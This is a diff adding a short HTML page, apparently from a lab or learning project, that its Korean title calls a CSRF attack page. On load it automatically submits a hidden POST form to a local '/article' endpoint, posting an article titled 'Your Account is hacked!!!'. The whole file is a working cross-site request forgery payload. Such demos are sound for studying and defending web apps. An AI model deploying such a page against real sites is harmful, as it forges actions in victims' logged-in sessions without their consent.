@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF 공격 페이지</title>
+</head>
+<body onload="document.forms[0].submit();">
+<h3>⚠ CSRF 공격 시도 중</h3>
+<form method="POST" action="http://localhost:8080/article">
+    <input type="hidden" name="title" value="Your Account is hacked!!!">
+    <input type="hidden" name="content" value="Your Account is hacked!!!Your Account is hacked!!!Your Account is hacked!!!Your Account is hacked!!!Your Account is hacked!!!Your Account is hacked!!!Your Account is hacked!!!Your Account is hacked!!!">
+</form>
+</body>
+</html>
